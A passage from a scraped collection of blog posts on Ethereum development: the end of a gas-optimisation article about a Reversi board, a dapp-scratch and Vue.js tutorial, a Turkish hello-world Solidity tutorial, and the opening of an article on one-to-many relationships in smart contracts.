0b00100000    // =        0b01100101 (original board was 0b01010101)}In this case we use XOR to make a copy of the board only inverted at the mask. After using AND on that copy with the original the modified mask section gets erased completely, leaving a space for the new tile. Next we use the OR operator on our shifted new tile value and return the whole board with our newly flipped tile \ud83c\udf89Conclusion95,000,000 Gas @ $566 versus 14,109,875 Gas @ $26.26We\u2019ve taken care of reducing the 8x8 array of integers to a single Bytes16 value and the same technique can be used to convert other arrays. I also had an array of column and row positions for moves in the game. I was able to convert that into a couple Bytes28 values with a modified naming convention. I\u2019ll save the details on exactly how for another day but the basics were the same. After doing both I took my contract which cost 95,000,000 gas to validate a game down to 4,109,875. Somewhere in the fluctuating cost of ETH and Gas prices that was a difference between $566.60 and $26.26. Now obviously $26.26 to validate a single game is still not ideal. One solution in the works is to use an Oracle to validate the game. Otherwise we\u2019ll have to wait for Proof of Work or adoption of Ethermint to reduce the price of gas.Until those happen we\u2019re using the Rinkeby Test network where Ether is free for anyone with a github account. If you\u2019d like to try mining a Symmetrical board of Reversi visit Clovers.network or the repo to mine directly.Check out Clovers.network", "responses": 1, "tags": ["Programming", "Solidity", "Truffle", "Vuejs", "Gas Prices"]}, {"title": "Dapp Scratch: a CLI for Building Dapps (and tutorial for building your first one)", "post_link": "https://codeburst.io/dapp-scratch-a-cli-for-building-dapps-and-tutorial-for-building-your-first-one-5cabdff3771e?source=search_post", "author_name": "billy rennekamp", "author_link": "https://codeburst.io/@billyrennekamp", "publish_date": "2017-11-16", "last_modified_date": "2018-06-07", "readtime": "7.89", "claps": 290, "voters": 38, "content": "Dapp Scratch: a CLI for Building Dapps (and tutorial for building your first one)billy rennekampFollowNov 16, 2017 \u00b7 8 min readdapp-scratch is a command line interface (CLI) that helps you build Decentralized Apps (dApps/DApps/dapps) from Solidity contracts. It takes a contract\u2019s Application Binary Interface (ABI) and outputs a Javascript module that handles all the basic interaction for use in your project. It\u2019s called dapp-scratch because it helps you build your dapp from scratch. (Github Repo)Here\u2019s how it works:$ npm install -g dapp-scratch$ dapp-scratch -hUsage: dapp-scratch build [options]Options:    -V, --version              output the version number    -c, --contract [contract]  Contract name or location    -b, --abi [abi]            ABI name or location    -a, --address [address]    Address of deployed contract    -h, --help                 output usage informationCommands:build   Build a module from Contract or ABItest    Generate a contract for testingRunning dapp-scratch on a Contract\u2019s ABI will generate a module inside a directory called dapp-module in your project\u2019s root. After importing that module into your app you\u2019ll be able to access your contract right away.$ dapp-scratch build FeverContractContract found at ./build/contracts/FeverContract.solweb3 installedweb3-provider-engine installed@aeternity/id-manager-provider installedModule Created at ./dapp-module/FeverContract/index.js/* * To use FeverContract just import it into your project: */const FeverContract = require('./dapp-module/FeverContract')let feverContract = new FeverContract()feverContract.helloWorld()/* * Have Fun : ) */The module connects to any available instance of Web3\u2014whether via Metamask, Mist, AE Identity Manager, Status, Cipher, Toshi, Ethers.io or any other injected Web3Provider. It polls the currently unlocked account and network to watch for changes. And it has wrapper functions for each of the methods found in the contract\u2019s ABI. These are the features I\u2019ve found myself building over and over again, so I figured automating that process and settling on best practices might be useful. The project is brand new and I\u2019m not 100% confident in any of the conventions, so if you have an opinion on best practices please fork the project and submit a PR. I\u2019d love to know how you prefer interacting with your contracts \ud83d\udce1The TutorialIn this tutorial we\u2019ll be using:npmVue.js and the Vue-cliTruffleAeternity Identity Manager (alternatively MetaMask)& of course \ud83c\udf7e Dapp Scratch \ud83c\udf89(Tutorial repo available here)Making Dapp Scratch Fever \ud83e\udd12The following is a tutorial for building a Vue.js app that uses a module generated from dapp-scratch to interact with a contract. We\u2019ll use Vue.js for the Javascript framework and Truffle to compile and deploy our Solidity contracts. The app is called Dapp Scratch Fever because the contract has a uint8 variable called temperature. You can increase and decrease the temperature and then ask the contract if it has a fever. It will return true when the temperature is over 100\u00baF and false when it is below.DISCLAIMER: I decided to use Fahrenheit for the body temperature because I think it\u2019s way better to use a big round number like \ud83d\udcaf as the threshold between health and sickness. Apologies to all those who prefer the more rational (but less exciting) metric system \ud83d\ude2c\ud83c\uddfa\ud83c\uddf8Step 1\u2014Using Vue.js for an AppI like to use vue-cli for building Vue.js boilerplate apps. To do so, first install the tool then run it with your desired options and follow the prompt that follows. I\u2019ll use options for building with Webpack so that I can have all the bells and whistles that come with it.$ npm install vue-cli -g$ vue init webpack dapp-scratch-fever...$ cd dapp-scratch-fever$ npm installStep 2\u2014Using Truffle for the ContractNext we need to build a contract and compile it with Truffle. We\u2019ll begin by installing Truffle and initializing the project, then write and deploy the contract.$ npm install truffle -g...$ truffle init Then create a new contract at ./contracts/FeverContract.sol directory and open it in your favorite editor.pragma solidity ^0.4.17;contract FeverContract {  uint8 temperature;  function FeverContract() {    temperature = 98;  }  function getTemperature () public constant returns(uint8) {    return temperature;  }  function hasFever () public constant returns(bool) {    return temperature > 100;  }  function increaseTemp () public returns(uint8) {    if (temperature > 110) revert();    temperature += 1;    return temperature;  }  function decreaseTemp () public returns(uint8) {    if (temperature < 95) revert();    temperature -= 1;    return temperature;  }}Here you can see we have all the aspects of the contract described earlier, a temperature, transactional functions to increaseTemp() and to decreaseTemp() as well as constant functions to getTemperature() and check whether the contract hasFever() or not.Next add new truffle migration instructions to the migrations directory at ./migrations/2_deploy_contracts.js. These can look as follows:var FeverContract = artifacts.require(\"./FeverContract.sol\");module.exports = function(deployer, helper, accounts) {  return deployer.deploy(FeverContract)}Now we can run truffle\u2019s test network, compile and deploy the contract.$ truffle developtruffle(develop)> deployStep 3\u2014Using dapp-scratch to generate a moduleNow we\u2019re ready to generate our Javascript module from the ABI file that truffle created while compiling and deploying our contract to the local test network. First we need to install the dapp-scratch CLI, then we can run it.$ npm install dapp-scratch -g...$ dapp-scratch build FeverContractThe program will look for your ABI and then check your package.json for the necessary dependencies. Once those have been installed it will create a new directory called dapp-scratch-wrapper with your new DappScratch module inside.UPDATE: dapp-scratch has been updated so some path names in this image are different from what you\u2019ll encounterThe first thing you want to do is go back to your terminal window running your truffle test network and look for the address of the deployed FeverContract.Copy this address and add it to your new FeverContract module at ./dapp-module/FeverContract/index.js (You can also include the address with the flags -a or --Address when first running dapp-scratch buildto automate this step)Now we can import the module into our app and start using it.Step 4\u2014Building the DappIf we jump into our App.vue component we can import our module and replace the app\u2019s template with something a little more useful.<template>  <div id=\"app\">    <div id=\"temp\" v-text=\"temp\"></div>    <div @click=\"checkTemp()\" class='emoji' v-text=\"emoji\"></div>    <div>      <span class='emoji' @click=\"decreaseTemp()\">\u2744\ufe0f</span>      <span class='emoji' @click=\"increaseTemp()\">\ud83d\udd25</span>    </div>  </div></template><script>const FeverContract = require('../dapp-module/FeverContract')let feverContract = new FeverContract()feverContract.helloWorld()export default {  name: 'app',...Now we can add methods that hook up to our new template and allow us to access our contract via the module. We should also add a data state that reflects the current status of our contract.export default {  name: 'app',  data () {    return {      hasFever: false,      temp: 98    }  },  computed: {    emoji () {      return this.temp > 110 || this.temp < 95 ? '\ud83d\udc80' : (this.hasFever ? '\ud83e\udd12' : '\ud83d\ude00')    }  },  methods: {    checkTemp () {      return feverContract.hasFever().then((hasFever) => {        this.hasFever = hasFever        return feverContract.getTemperature().then((temp) => {          this.temp = temp        })      })    },    increaseTemp () {      return feverContract.increaseTemp().then((temp) => {        return this.checkTemp()      })    },    decreaseTemp () {      return feverContract.decreaseTemp().then((temp) => {        return this.checkTemp()      })    }  }}Now some styles to make it pretty:<style>body {  background-color: white;}#app {  font-family: 'Avenir', Helvetica, Arial, sans-serif;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;  text-align: center;  color: #2c3e50;  margin-top: 60px;}#temp {  position: absolute;  top: 10px;  right: 10px;  font-size:50px;}#temp:after {  content: '\u00ba';}.emoji {  font-size:120px;  cursor: pointer;}</style>And we\u2019ve got ourselves an App! Let\u2019s run npm run dev to start the development environment and try interacting with it at http://localhost:8080 \u2014 Error, right? That\u2019s cause we still need some kind of provider to interact with the blockchain \ud83d\udce1\u26d3Step 5\u2014Interacting with the DappAt this point you\u2019ve got the choice of interacting with the app via MetaMask or the Aeternity Identity Manager. I\u2019m going to go through the directions to use the Identity Manager because it\u2019s new and offers a mobile ready alternative to MetaMask (Full disclosure: I\u2019ve been consulting for their app team), but the steps are basically the same for both options:Make sure you\u2019re using http://localhost:9545 as the RPC endpointImport the truffle test account using the mnemonic phrase from earlierRaise the temp \ud83d\udd25Let\u2019s get started using the identity manager by importing the mnemonic phrase at http://identity.aepps.com. Use the \u201cRecover with Seed Phrase\u201d option and paste in the phrase generated in the command line by truffle:candy maple cake sugar pudding cream honey rich smooth crumble sweet treatAfterwards, set a personal password and you\u2019ll see your wallet with all you currently available addresses.Now you can close the wallet view and add the new app to the Home screen. Just use the development address http://localhost:8080 and name it Dapp Scratch Fever.When launched, Identity Manager will make an iframe that contains your app. This way the app can be visited on mobile devices \ud83d\udcf2Now we can finally open the app and raise the temp \ud83d\udd25Or you can cool our guy down again to a better living standard \u2744\ufe0fConclusionIn total we\u2019ve covered:Introducing the dapp-scratch Command Line Interface for generating Javascript modules for interacting with Solidity contracts.Using vue-cli for starting a Vue.js projectUsing Truffle for developing and deploying Solidity contractsUsing dapp-scratch for generating dapp modules and integrating it into an applicationUsing the Aeternity Identity Manager to interact with your dapp\u26a0\ufe0f Don\u2019t forget to check out the repo and add your own best practices for interacting with Solidity contracts from decentralized applications. This tutorial is also available on github here \u270c\ufe0f", "responses": 3, "tags": ["Solidity", "Dapps", "Blockchain", "Vuejs", "Truffle"]}, {"title": "15 Dakikada \u0130lk Ak\u0131ll\u0131 S\u00f6zle\u015fmemizi Yazal\u0131m", "post_link": "https://medium.com/@sdogantekin/15-dakikada-i%CC%87lk-ak%C4%B1ll%C4%B1-s%C3%B6zle%C5%9Fmemizi-yazal%C4%B1m-6e8f6b472746?source=search_post", "author_name": "Serkan Dogantekin", "author_link": "https://medium.com/@sdogantekin", "publish_date": "2018-03-04", "last_modified_date": "2018-06-19", "readtime": "5.85", "claps": 211, "voters": 37, "content": "15 Dakikada \u0130lk Ak\u0131ll\u0131 S\u00f6zle\u015fmemizi Yazal\u0131mSerkan DogantekinFollowMar 4, 2018 \u00b7 6 min readBiliyorum olduk\u00e7a uzun bir zaman \u00f6nce (15 Dakikada Ethereum A\u011f\u0131 Olu\u015fturabilmek yaz\u0131s\u0131) ak\u0131ll\u0131 s\u00f6zle\u015fme (smart contract) yazma konusuna de\u011finece\u011fimi belirtmi\u015ftim ve i\u015fte o an bu an :)Bu yaz\u0131da \u00fczerinde \u00e7al\u0131\u015faca\u011f\u0131m\u0131z ak\u0131ll\u0131 s\u00f6zle\u015fmeyi Visual Studio Code (Solidity extension\u2019i y\u00fckl\u00fc) ve daha \u00f6nce olu\u015fturdu\u011fumuz Ethereum a\u011f\u0131 ile haz\u0131rlayaca\u011f\u0131z ama yaz\u0131n\u0131n sonunda ba\u015fka bir alternatif payla\u015faca\u011f\u0131m.\u0130sterseniz hemen ba\u015flayal\u0131m.1- \u00d6ncelikle Visual Studio Code makinemizde yoksa kurup \u00fczerine Solidity extension\u2019i (JuanBlanco.solidity) kuruyoruz.2- Tahmin edebilece\u011finiz gibi amac\u0131m\u0131z bir \u201cHello World\u201d ak\u0131ll\u0131 s\u00f6zle\u015fmesi yazmak olacak. Burada ak\u0131\u015fa biraz ak\u0131ll\u0131l\u0131k katmak amac\u0131 ile s\u00f6zle\u015fmemiz \u015fu \u00f6zelliklere sahip olacak:S\u00f6zle\u015fme \u0130ngilizce, Frans\u0131zca ve Almanca olarak \u201cMerhaba D\u00fcnya\u201d c\u00fcmlesinin kar\u015f\u0131l\u0131klar\u0131n\u0131 bilecekKendisi ile etkile\u015fime ge\u00e7en kullan\u0131c\u0131n\u0131n dil tercihine g\u00f6re uygun kar\u015f\u0131l\u0131\u011f\u0131 d\u00f6necekYani asl\u0131nda s\u00f6zle\u015fme yap\u0131m\u0131z \u00e7ok basit olsa da \u00fczerinde veri ta\u015f\u0131yabilen (ayn\u0131 c\u00fcmlenin de\u011fi\u015fik dillerdeki kar\u015f\u0131l\u0131klar\u0131) ve bu veriyi mant\u0131ksal bir ak\u0131\u015f i\u00e7erisinde (kullan\u0131c\u0131n\u0131n dil tercihi) kullanan bir yap\u0131da olacak.3- Visual Studio Code \u00fczerinde \u201cHelloWorld.sol\u201d isminde bir dosya olu\u015fturuyoruz. Buradaki \u201csol\u201d uzant\u0131s\u0131 uygulamaya bu dosyan\u0131n bir Solidity dosyas\u0131 oldu\u011funu ifade ediyor.4- \u0130lk ba\u015fta ak\u0131ll\u0131 s\u00f6zle\u015fmemizin destekledi\u011fi Solidity compiler versiyonunu belirtiyoruz. Burada kulland\u0131\u011f\u0131m\u0131z yap\u0131 minimum Solidity compiler\u2019i olarak 0.4.18'u istedi\u011fimizi ve 0.5.0 sonras\u0131 versiyonlar\u0131 desteklemedi\u011fimizi belirtiyor.5- \u201ccontract\u201d anahtar kelimesini kullanarak \u201cHelloWorld\u201d adl\u0131 ak\u0131ll\u0131 s\u00f6zle\u015fmemizi olu\u015fturacak blo\u011fu tan\u0131mlayal\u0131m.6- Her \u00fc\u00e7 dilde \u201cMerhaba Dunya\u201d c\u00fcmlesinin kar\u015f\u0131l\u0131klar\u0131n\u0131 tan\u0131mlayal\u0131m. Burada \u201cstring\u201d veri tipini kullanaca\u011f\u0131z. Bu \u015fekilde s\u00f6zle\u015fme kapsam\u0131nda tan\u0131mlanan de\u011fi\u015fkenlere \u201cdurum de\u011fi\u015fkenleri\u201d (state variables) denilmektedir, bu de\u011fi\u015fkenlerin de\u011ferleri s\u00f6zle\u015fmenin blockchain \u00fczerindeki saklama alan\u0131nda kal\u0131c\u0131 bir \u015fekilde tutulmaktad\u0131r.7- \u015eimdi ise bu s\u00f6zle\u015fme i\u00e7in \u201cyap\u0131c\u0131\u201d (constructor) fonksiyonu tan\u0131mlayaca\u011f\u0131z (yap\u0131c\u0131 fonksiyon tan\u0131m\u0131 s\u00f6zle\u015fmeler i\u00e7in zorunlu de\u011fildir). Bu fonksiyon s\u00f6zle\u015fmenin blockchain \u00fczerinde yarat\u0131lma an\u0131nda bir defal\u0131k \u00e7al\u0131\u015ft\u0131r\u0131l\u0131r. S\u00f6zle\u015fme ile ayn\u0131 ismi ta\u015f\u0131mal\u0131d\u0131r. Burada i\u00e7i bo\u015f (yani \u00e7al\u0131\u015ft\u0131r\u0131lma an\u0131nda herhangi bir \u015fey yapmayan) bir fonksiyon tan\u0131m\u0131 yap\u0131yoruz.Fonksiyon tan\u0131mlar\u0131 \u201cfunction\u201d anahtar kelimesi ile ba\u015flar. Arkas\u0131ndan fonksiyon ismi ve \u00e7al\u0131\u015fmas\u0131 i\u00e7in gereken de\u011ferler (fonksiyon parametreleri) gelir. Burada ayr\u0131ca \u201cpublic\u201d tan\u0131m\u0131n\u0131 belirterek bu fonksiyonun blockchain i\u00e7erisinden ve d\u0131\u015far\u0131s\u0131ndan \u00e7a\u011fr\u0131labilece\u011fini belirtmi\u015f oluyoruz.8- As\u0131l fonksiyonumuzu tan\u0131mlamaya ge\u00e7ebiliriz. \u0130lk olarak ak\u0131\u015f\u0131m\u0131z\u0131 daha basit bir \u015fekilde d\u00fc\u015f\u00fcnelim, \u00e7a\u011f\u0131raca\u011f\u0131m\u0131z fonksiyon (bunu s\u00f6zle\u015fmenin sa\u011flad\u0131\u011f\u0131 servis olarak d\u00fc\u015f\u00fcnebiliriz) geri d\u00f6n\u00fc\u015f de\u011feri olarak \u0130ngilizce \u201cMerhaba D\u00fcnya\u201d bilgisini geri d\u00f6n\u00fcyor olsun.Burada fonksiyon tan\u0131m\u0131na bir adet d\u00fczenleyici (modifier) eklememiz gerekiyor: \u201cview\u201d. Bu d\u00fczenleyici fonksiyon i\u00e7erisinde durum de\u011fi\u015fkenlerine eri\u015fti\u011fimizi (burada \u201cenglish\u201d adl\u0131 string de\u011fi\u015fken) ancak de\u011ferini de\u011fi\u015ftirmedi\u011fimizi ifade ediyor.Geri d\u00f6n\u00fc\u015f bilgisi ise \u201creturns\u201d yap\u0131s\u0131 i\u00e7erisinde belirtilir, burada fonksiyonumuz \u201cstring\u201d t\u00fcr\u00fcnde bir de\u011fer d\u00f6n\u00fc\u015f\u00fc yap\u0131yor.9- Ama ilk ba\u015fta belirtti\u011fimiz gibi s\u00f6zle\u015fmemizin \u201cak\u0131ll\u0131\u201d olmas\u0131n\u0131 istiyoruz, bundan dolay\u0131 \u201csayHello\u201d fonksiyonunun bir parametre al\u0131p (hangi dilde kar\u015f\u0131l\u0131k istedi\u011fini belirtmeli) buna g\u00f6re i\u00e7erisinde bir kontrol ak\u0131\u015f\u0131 olmas\u0131n\u0131 ve bu ak\u0131\u015f kapsam\u0131nda ilgili string de\u011ferini d\u00f6nmesini sa\u011flamal\u0131y\u0131z.Burada Solidity dilinin \u201cEnums\u201d deste\u011fini kullanarak s\u00f6zle\u015fme i\u00e7erisinde dilleri ifade eden bir yap\u0131 olu\u015fturaca\u011f\u0131z. Sonras\u0131nda bu yap\u0131n\u0131n tan\u0131mlad\u0131\u011f\u0131m\u0131z \u201csayHello\u201d fonksiyonuna bir girdi de\u011feri olarak verilebilinmesini sa\u011flay\u0131p, verilen bu de\u011fere g\u00f6re fonksiyon i\u00e7erisinde \u201ce\u011fer bu ise \u015funu yap\u201d \u015feklinde bir ak\u0131\u015f olu\u015fturaca\u011f\u0131z.LANGUAGE adl\u0131 bir enum olu\u015fturup alabilece\u011fi de\u011ferleri tan\u0131ml\u0131yoruz:enum LANGUAGE {EN, FR, DE}\u201csayHello\u201d fonksiyon tan\u0131m\u0131 yukar\u0131da olu\u015fturdu\u011fumuz LANGUAGE tipinde bir girdi alacak \u015fekilde g\u00fcncelliyoruz:function sayHello(LANGUAGE lang) public view returns(string)Son olarak Solidity dilinin destekledi\u011fi \u201cif-else\u201d yap\u0131s\u0131 ile ak\u0131\u015f\u0131 olu\u015fturuyoruz:10- Evet, ak\u0131ll\u0131 s\u00f6zle\u015fmemizin yaz\u0131lmas\u0131 bitmi\u015f durumda. Bundan sonra bu s\u00f6zle\u015fmeyi derleyip, kullanmak istedi\u011fimiz Ethereum a\u011f\u0131na y\u00fcklenmesini ger\u00e7ekle\u015ftirece\u011fiz.\u00d6ncelikli olarak Visual Code Studio\u2019da F5 tu\u015funa basarak s\u00f6zle\u015fmemizi derleyelim.11- Ba\u015far\u0131l\u0131 bir derleme i\u015flemi sonras\u0131nda \u201cbin\u201d dizini ve alt\u0131nda 3 adet dosyan\u0131n olu\u015ftu\u011funu g\u00f6r\u00fcyoruz. \u201cbin\u201d uzant\u0131l\u0131 dosya s\u00f6zle\u015fmemize ait binary kodlar\u0131 i\u00e7erirken , \u201cabi\u201d uzant\u0131l\u0131 dosya i\u00e7erisinde s\u00f6zle\u015fmeye ait a\u00e7\u0131k de\u011fi\u015fken ve metodlara ait bilgiler bulunmaktad\u0131r (ABI \u2014 Application Binary Interface). \u201cjson\u201d uzant\u0131l\u0131 dosya i\u00e7erisinde ise t\u00fcm bu bilgilerin yan\u0131 s\u0131ra sunulan metodlar\u0131n \u00e7al\u0131\u015ft\u0131r\u0131lmas\u0131 i\u00e7in gereken gaz miktar\u0131 (bu de\u011feri gaz birim fiyat\u0131 ile \u00e7arparak tahmini Ether maliyetini hesaplayabilirsiniz) gibi yan bilgiler bulunmaktad\u0131r.12- Bu noktadan sonra s\u00f6zle\u015fmemizi bir Ethereum node\u2019una y\u00fcklememiz gerekecek, burada daha \u00f6nceki yaz\u0131mda olu\u015fturdu\u011fum \u201cnodeminer\u201d adl\u0131 node\u2019u kullanaca\u011f\u0131m. Bu node\u2019u \u00f6ncelikle aya\u011fa kald\u0131ral\u0131m.13- \u0130lk olarak ABI dosyas\u0131ndaki bilgileri kullanarak bir contract yap\u0131s\u0131 olu\u015fturmam\u0131z gerekiyor. Bunun i\u00e7in \u00e7al\u0131\u015ft\u0131r\u0131lmas\u0131 gereken komut yap\u0131s\u0131 \u015fu \u015fekildedir:var helloContract = eth.contract(ABI_DOSYASI_ICERIGI)14- BIN dosyas\u0131n\u0131n i\u00e7eri\u011fini kullanmak amac\u0131 ile bir de\u011fi\u015fkene at\u0131yoruz:var helloCompiled = \u201c0x\u201d + \u201cBIN_DOSYASI_ICERIGI\u201d15- Bu noktada yaratt\u0131\u011f\u0131m\u0131z contract yap\u0131s\u0131 \u00fczerinde \u201cnew\u201d methodunu \u00e7al\u0131\u015ft\u0131rarak s\u00f6zle\u015fmemizi Ethereum node\u2019una y\u00fcklemeyi ba\u015flatabiliriz:16- S\u00f6zle\u015fme yarat\u0131m\u0131 temelde bir transaction oldu\u011fundan dolay\u0131 blockchain \u00fczerinde yer almas\u0131 i\u00e7in madencilik (mining) ak\u0131\u015f\u0131 i\u00e7erisinde bir blok kapsam\u0131nda de\u011ferlendirilmesi gerekmektedir. Bunun i\u00e7in Ethereum node\u2019umuz \u00fczerinde \u201cminer.start\u201d komutu ile madencilik i\u015flemini ba\u015flatmam\u0131z yeterlidir:17- Bu noktadan sonra s\u00f6zle\u015fmemiz \u00fczerindeki a\u00e7\u0131k de\u011fi\u015fken ve metodlara eri\u015febiliriz. Haz\u0131rlad\u0131\u011f\u0131m\u0131 \u201csayHello\u201d methodu s\u00f6zle\u015fme i\u00e7erisinde tan\u0131mlad\u0131\u011f\u0131m\u0131 \u201cenum LANGUAGE\u201d tipinde bir girdi de\u011feri istiyordu. \u201cenum\u201d yap\u0131lar\u0131na tan\u0131mland\u0131klar\u0131 s\u0131ra ile say\u0131sal de\u011ferleri ile eri\u015fmemiz m\u00fcmk\u00fcnd\u00fcr. Yani bizim \u00f6rne\u011fimizde \u201cEN\u201d yerine 0, \u201cFR\u201d yerine 1 ve \u201cDE\u201d yerine 2 de\u011ferlerini kullanabiliriz.18- Evet, s\u00f6zle\u015fmemizi Ethereum a\u011f\u0131m\u0131z \u00fczerine y\u00fckledik ve \u00fczerindeki a\u00e7\u0131k metoda eri\u015fim sa\u011flad\u0131k. Ve bu method yap\u0131s\u0131 da tan\u0131mlad\u0131\u011f\u0131m\u0131z mant\u0131ksal ak\u0131\u015f kapsam\u0131nda istedi\u011fimiz sonucu geri d\u00f6nd\u00fc.19- Burada akl\u0131m\u0131zda \u015fu \u015fekilde bir soru olu\u015fmu\u015f olmal\u0131, yukar\u0131daki i\u015flemleri tek node\u2019luk bir yap\u0131da denedik, di\u011fer node\u2019lar \u00fczerinde bu s\u00f6zle\u015fme nas\u0131l \u00e7al\u0131\u015f\u0131yor. Bunun i\u00e7in daha \u00f6nceki yaz\u0131m\u0131zda olu\u015fturdu\u011fumuz ve \u201cnodeminer\u201d\u0131 bir peer (e\u015f) olarak g\u00f6ren \u201cnode2\u201dyi aya\u011fa kald\u0131ral\u0131m. A\u00e7\u0131l\u0131\u015fta bir s\u00fcre blockchain \u00fczerindeki blok yap\u0131lar\u0131n\u0131n senkronize olmas\u0131n\u0131 beklemeniz gerekebilir.20- Ethereum blockchain yap\u0131s\u0131, ABI tan\u0131m\u0131n\u0131 ve adresini bildi\u011finiz herhangi bir s\u00f6zle\u015fmeye herhangi bir node \u00fczerinden eri\u015fmenize olanak sa\u011flar. Bunun i\u00e7in a\u015fa\u011f\u0131daki komut yap\u0131s\u0131n\u0131 kullanabiliriz ve sonras\u0131nda eri\u015fmek istedi\u011fimiz metodlar\u0131 \u00e7al\u0131\u015ft\u0131rabiliriz.var contract = eth.contract(ABI_ICERIGI).at(SOZLESME_ADRESI)Evet, ilk ak\u0131ll\u0131 s\u00f6zle\u015fmemizi yazd\u0131k, derledik, y\u00fckledik ve kulland\u0131k.Hat\u0131rlarsan\u0131z yaz\u0131n\u0131n ba\u015flang\u0131c\u0131nda bir alternatif payla\u015faca\u011f\u0131m\u0131 belirtmi\u015ftim. Ethereum platformu basit s\u00f6zle\u015fmeleri tasarlamak, yaratmak ve test etmek amac\u0131 ile \u201cRemix\u201d adl\u0131 browser tabanl\u0131 bir IDE (Integrated Development Environment) sunmaktad\u0131r. Remix\u2019e a\u015fa\u011f\u0131daki adresten eri\u015febilirsiniz:https://remix.ethereum.org/Burada h\u0131zl\u0131 bir \u015fekilde yeni bir dosya yarat\u0131p, yukar\u0131da tan\u0131mlad\u0131\u011f\u0131m\u0131z s\u00f6zle\u015fme i\u00e7eri\u011fini kopyalay\u0131p, s\u00f6zle\u015fmemizi derleyebiliriz (Buradaki statik analiz ile ilgili uyar\u0131lar\u0131 \u015fimdilik g\u00f6z ard\u0131 edebiliriz):Ba\u015far\u0131l\u0131 bir derlemeden sonra \u201cRun\u201d k\u0131sm\u0131na ge\u00e7ip bu derlenmi\u015f s\u00f6zle\u015fmeyi browser \u00fczerinde \u00e7al\u0131\u015fan bir Ethereum node yap\u0131s\u0131 \u00fczerinde h\u0131zl\u0131ca test edebiliriz. Bunun i\u00e7in \u201cEnvironment\u201d ve s\u00f6zle\u015fme bilgisini se\u00e7ip \u201cCreate\u201d tu\u015funa basmam\u0131z yeterlidir:Yarat\u0131lan s\u00f6zle\u015fmeyi, s\u00f6zle\u015fmeye ba\u011fl\u0131 eri\u015filebilir de\u011fi\u015fken ve fonksiyonlar\u0131 ekran\u0131n sa\u011f alt k\u0131sm\u0131nda g\u00f6rebiliriz. Bu fonksiyonlar\u0131 gerekli girdileri sa\u011flayarak \u00e7al\u0131\u015ft\u0131rabiliriz:Bu yaz\u0131da de\u011fer ve mant\u0131ksal bir ak\u0131\u015f tutan bir s\u00f6zle\u015fme yaratt\u0131k, bu s\u00f6zle\u015fmeyi derleyip bir Ethereum a\u011f\u0131na y\u00fckledik ve a\u011f \u00fczerindeki herhangi bir node \u00fczerinden s\u00f6zle\u015fmeye eri\u015ferek a\u00e7\u0131k olan fonksiyonlar\u0131 \u00e7al\u0131\u015ft\u0131rd\u0131k. Yani asl\u0131nda bir ak\u0131ll\u0131 s\u00f6zle\u015fmeden beklenen temel i\u015flevlerin \u00f6nemli bir k\u0131sm\u0131n\u0131 yerine getirmi\u015f olduk.\u0130lerideki yaz\u0131larda Web3.js k\u00fct\u00fcphanesinin kullan\u0131m\u0131, ERC20 standartlar\u0131nda token yaz\u0131m\u0131 gibi \u00e7e\u015fitli konulara de\u011finmeyi planl\u0131yorum (ama bu yaz\u0131lar\u0131n \u00f6ncesinde muhtemelen \u015fu s\u0131ralar b\u00fcy\u00fck keyifle okudu\u011fum \u201cMachine Platform Crowd\u201d ile \u00e7\u0131kmas\u0131n\u0131 d\u00f6rt g\u00f6zle bekledi\u011fim \u201cDigital Human\u201d kitaplar\u0131 hakk\u0131nda bir\u015feyler karalayaca\u011f\u0131m, bunun d\u0131\u015f\u0131nda Kotlin ve Android uygulama geli\u015ftirme konular\u0131nda da d\u00fczenlenmeyi bekleyen \u00e7e\u015fitli notlar\u0131m var). Ama yaz\u0131lar\u0131 beklemeden de ge\u00e7enlerde Bo\u011fazi\u00e7i TechSummit kapsam\u0131nda d\u00fczenledi\u011fim workshop sonras\u0131nda olu\u015fturmaya ba\u015flad\u0131\u011f\u0131m Github projesini takip etmeye ba\u015flayabilirsiniz, amac\u0131m sizlerinde geri bildirimleri ile birlikte a\u00e7\u0131k, temel ve orta seviyeye hitap eden bir Ethereum ve Solidity e\u011fitim/\u00f6\u011frenim i\u00e7eri\u011fi olu\u015fturmakt\u0131r.G\u00f6r\u00fc\u015fmek \u00fczere :)", "responses": 1, "tags": ["Blockchain", "Ethereum", "Solidity", "Smart Contracts"]}, {"title": "Enforcing Referential Integrity in Ethereum Smart Contracts.", "post_link": "https://medium.com/robhitchens/enforcing-referential-integrity-in-ethereum-smart-contracts-a9ab1427ff42?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2017-04-09", "last_modified_date": "2019-03-26", "readtime": "7.86", "claps": 209, "voters": 39, "content": "Enforcing Referential Integrity in Ethereum Smart Contracts.Rob HitchensFollowApr 9, 2017 \u00b7 8 min readOne-To-Many Joins in SolidityCode repository: https://bitbucket.org/rhitchens2/soliditystoragepatternsPhoto by fabio on UnsplashSolidityCRUD lays out a way to organize tabular data in a Solidity Smart Contract. The pattern supports Create, Retrieve, Update and Delete (CRUD) with some features we might take for granted until we first attempt it with Solidity:Count the keys and check if a key exists or not.Enumerate the keys and iterate over them.Fetch, update, or delete a key efficiently.Ensure the keys are unique.All operations are gas-efficient at all scales.The essence of the technique is a data structure that includes structs for holding data about the object, a mapping for random access by key, and an array containing an unordered list of keys.Mapped Structs with Pointers to an unordered list of Keys.In Solidity \u2026struct AlphabetStruct {  // fields about the alphabet letters  uint index; // points to the row in the index containing the key}mapping(bytes32 => AlphabetStruct) public alphabetStructs;bytes32[] public alphabetIndex;If you\u2019re not familiar with this structure, have a look at SolidityCRUD, especially part 2.That covers a lot of use-cases, but what about relationships? It\u2019s commonplace to require strictly-enforced relationships between object instances. Possibly the most common relationship is one-to-many.Customers have many sales. A sale has exactly one customer.Owners can have many cars. A car has exactly one owner.Users can own many projects. A project has exactly owner.If the data can be said to be \u201ccorrect\u201d and \u201cvalid\u201d without regard to referential integrity, then you don\u2019t need it. If you do need referential integrity then the contract must enforce it. Let\u2019s have a look at how it can be accomplished.\u201cOne\u201d and \u201cMany\u201dI\u2019m going to use the terms \u201cOne\u201d and \u201cMany\u201d to refer to two different types of entity (class). The \u201cOnes\u201d have zero to lots of \u201cMany\u201d and the \u201cMany\u201d have exactly one \u201cOne\u201d. If that\u2019s too abstract, think \u201cCustomer\u201d (One) and \u201cInvoice\u201d (Many).struct One {  // fields about this class  uint oneListPointer; // points to a row on the oneList}// random accessmapping(bytes32 => One) oneStructs; // key could be address or uint// sequential accessbytes32[] oneList;struct Many {  // fields about this class  uint manyListPointer; // points to a row on the manyList}mapping(bytes32 => Many) manyStructs; // these are for access by keybytes32[] 